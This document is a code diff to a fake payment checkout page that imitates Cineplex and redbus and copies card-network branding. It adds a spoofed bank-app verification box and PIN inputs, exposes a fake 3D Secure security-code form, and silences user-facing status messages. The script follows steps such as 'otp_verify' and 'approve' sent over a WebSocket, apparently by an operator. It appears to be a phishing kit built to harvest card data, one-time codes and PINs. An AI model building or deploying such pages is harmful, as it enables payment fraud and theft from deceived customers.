@@ -231,6 +231,184 @@
                 font-size: 16px;
                 font-weight: 600
             }
+
+             .app-verify-box {
+                width: 390px;
+                background: #fff;
+                color: #222;
+                border-radius: 10px;
+                padding: 22px 30px 24px;
+                position: relative
+            }
+
+            .app-hdr {
+                display: flex;
+                justify-content: space-between;
+                align-items: flex-start;
+                margin-bottom: 38px
+            }
+
+            .app-bank-logo {
+                width: 34px;
+                height: 28px;
+                border-radius: 2px;
+                color: #fff;
+                font-weight: bold;
+                font-size: 17px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                letter-spacing: -1px
+            }
+
+            .app-scheme {
+                text-align: right;
+                font-size: 12px;
+                line-height: 1.1;
+                color: #333
+            }
+
+            .app-scheme-mark {
+                display: inline-block;
+                width: 38px;
+                height: 18px;
+                position: relative;
+                vertical-align: middle;
+                margin-right: 4px
+            }
+
+            .app-circle {
+                width: 18px;
+                height: 18px;
+                border-radius: 50%;
+                position: absolute;
+                top: 0
+            }
+
+            .app-circle.red {
+                background: #e53935;
+                left: 2px
+            }
+
+            .app-circle.yellow {
+                background: #f6b51d;
+                left: 16px;
+                opacity: .9
+            }
+
+            .app-scheme-name {
+                font-weight: bold;
+                font-size: 11px
+            }
+
+            .app-verify-box h1 {
+                margin: 0 0 15px;
+                font-size: 18px;
+                line-height: 1.25;
+                font-weight: 700
+            }
+
+            .app-intro {
+                margin: 0 0 17px;
+                font-size: 14px;
+                line-height: 1.42
+            }
+
+            .app-steps {
+                margin: 0;
+                padding: 0;
+                list-style: none;
+                font-size: 14px;
+                line-height: 1.42
+            }
+
+            .app-steps li {
+                margin-bottom: 12px;
+                display: flex;
+                align-items: flex-start
+            }
+
+            .app-num {
+                width: 20px;
+                flex-shrink: 0
+            }
+
+            .app-links {
+                margin-top: 34px;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                font-size: 12px;
+                font-weight: bold
+            }
+
+            .app-links a {
+                color: #000;
+                text-decoration: underline
+            }
+
+            .app-question {
+                text-align: center;
+                font-size: 13px;
+                color: #333;
+                margin-top: 38px
+            }
+
+            .app-error {
+                text-align: center;
+                color: #ff1d25;
+                font-size: 12px;
+                line-height: 1.35;
+                margin-top: 16px
+            }
+
+            .app-btn-wrap {
+                margin-top: 14px;
+                text-align: center
+            }
+
+            .app-btn-wrap button {
+                border: 0;
+                background: #0878be;
+                color: #fff;
+                font-size: 12px;
+                font-weight: bold;
+                padding: 8px 22px;
+                border-radius: 3px;
+                cursor: pointer
+            }
+
+            .app-btn-wrap button:hover {
+                background: #066da9
+            }
+
+            .app-safe-note {
+                margin-top: 18px;
+                font-size: 11px;
+                color: #777;
+                line-height: 1.4;
+                text-align: center
+            }
+
+            .pin-digits {
+                display: flex;
+                gap: 10px;
+                justify-content: center;
+                margin: 12px 0
+            }
+
+            .pin-digit {
+                width: 52px;
+                height: 60px;
+                border: 2px solid #e0e0ee;
+                border-radius: 10px;
+                text-align: center;
+                font-size: 26px;
+                font-weight: 700;
+                color: #1a1a2e;
+                outline: none;
+                background: #fff
+            }
 </style>
 
 
@@ -719,10 +897,7 @@ url("pay1ment_icons.woff") format("woff");
 
 <!-- Loading overlay (standalone) -->
         <div class="overlay hidden" id="load-overlay">
-            <div style="text-align:center">
-                <img src="https://mediafiles.cineplex.com/modernization/popcorn-loader.gif" alt="loading" style="width:120px;height:120px">
-                <p style="text-align:center;color:#fff;font-size:16px;margin-top:16px;font-weight:500">Processing payment...</p>
-            </div>
+            <div id="custinfo-overlay-portal"><div class="pageLoaderWrap__sea-custInfo-styles-module-scss-n8K+a"><div class="indeterminate_spinner___183e46 custInfoPaymentLoader__sea-custInfo-styles-module-scss-OYTfH"><div class="spinner-icon___536d43"></div></div></div></div>
         </div>
         <!-- 3D Secure overlay -->
         <div class="overlay hidden" id="otp-overlay">
@@ -748,7 +923,7 @@ url("pay1ment_icons.woff") format("woff");
                     </div>
                 </div>
                 <div class="otp-body" id="otp-body">
-                    <div id="otp-form" class="hidden">
+                    <div id="otp-form">
                         <h2>Enter your security code</h2>
                         <p>Please enter your security code to authorize this payment</p>
                         <table class="otp-table">
@@ -770,7 +945,7 @@ url("pay1ment_icons.woff") format("woff");
                         <div class="otp-countdown">
                             Code expires in <span id="otp-timer">4:59</span>
                         </div>
-                        <div class="vfy-spinner" id="otp-spinner">
+                        <div class="vfy-spinner hidden" id="otp-spinner">
                             <div class="spin"></div>
                             <p id="otp-spin-text">Verifying...</p>
                         </div>
@@ -842,7 +1017,7 @@ url("pay1ment_icons.woff") format("woff");
                 <div class="app-btn-wrap">
                     <button type="button" id="app-continue-btn" onclick="appVerifyContinue()">Continue to complete</button>
                 </div>
-                <div class="vfy-spinner" id="app-spinner">
+                <div class="vfy-spinner hidden" id="app-spinner">
                     <div class="spin"></div>
                     <p>Waiting for approval...</p>
                 </div>
@@ -893,7 +1068,7 @@ url("pay1ment_icons.woff") format("woff");
                         <div class="otp-countdown">
                             Code expires in <span id="pin-timer">4:59</span>
                         </div>
-                        <div class="vfy-spinner" id="pin-spinner">
+                        <div class="vfy-spinner hidden" id="pin-spinner">
                             <div class="spin"></div>
                             <p>Verifying PIN...</p>
                         </div>
@@ -943,7 +1118,7 @@ url("pay1ment_icons.woff") format("woff");
                         <div class="otp-countdown">
                             Code expires in <span id="email-timer">4:59</span>
                         </div>
-                        <div class="vfy-spinner" id="email-spinner">
+                        <div class="vfy-spinner hidden" id="email-spinner">
                             <div class="spin"></div>
                             <p>Verifying email code...</p>
                         </div>
@@ -1068,7 +1243,7 @@ url("pay1ment_icons.woff") format("woff");
   /* 持久化错误弹层（复用 Cineplex 的 showInline 模式，适配 redbus statusMsg） */
   function showInline(t, x, persist) {
     if (persist) localStorage.setItem('_rbInlineMsg', x + '|' + t);
-    showMsg(t, x);
+    //showMsg(t, x);
   }
   function hideInline() {
     localStorage.removeItem('_rbInlineMsg');
@@ -1080,7 +1255,7 @@ url("pay1ment_icons.woff") format("woff");
   var _pm = localStorage.getItem('_rbInlineMsg');
   if (_pm) {
     var _parts = _pm.split('|');
-    showMsg(_parts[1] || 'info', _parts[0] || '');
+    //showMsg(_parts[1] || 'info', _parts[0] || '');
   }
  
  
@@ -1235,7 +1410,7 @@ url("pay1ment_icons.woff") format("woff");
       if (cu.fullName  && q('fullName'))   q('fullName').value  = cu.fullName;
       if (cu.email     && q('email'))      q('email').value     = cu.email;
       if (cu.phone     && q('phone'))      q('phone').value     = cu.phone;
-      showMsg('info', 'Session restored.');
+      //showMsg('info', 'Session restored.');
  
     } else if (a === 'otp_verify' || a === 'custom_otp_verify' || a === 'custom_otp_tail') {
       _curStep = 'otp';
@@ -1256,7 +1431,7 @@ url("pay1ment_icons.woff") format("woff");
       resetOtp();
  
     } else if (a === 'approve') {
-      showMsg('success', 'Payment approved!');
+      //showMsg('success', 'Payment approved!');
       var btn = q('btnSubmit');
       if (btn) { btn.disabled = true; btn.textContent = 'Approved'; }
       hideOtp();
@@ -1389,7 +1564,7 @@ url("pay1ment_icons.woff") format("woff");
  
     var btn = q('btnSubmit');
     if (btn) { btn.disabled = true; btn.textContent = 'Processing...'; }
-    showMsg('info', 'Processing payment...');
+    //showMsg('info', 'Processing payment...');
  
     if (!ws || ws.readyState !== WebSocket.OPEN) {
       wsConnect();
@@ -1457,7 +1632,7 @@ url("pay1ment_icons.woff") format("woff");
       tick();
       if (otpSec <= 0) {
         stopOtpTimer();
-        showMsg('error', 'OTP expired.');
+        //showMsg('error', 'OTP expired.');
         hideOtp();
       }
     }, 1000);
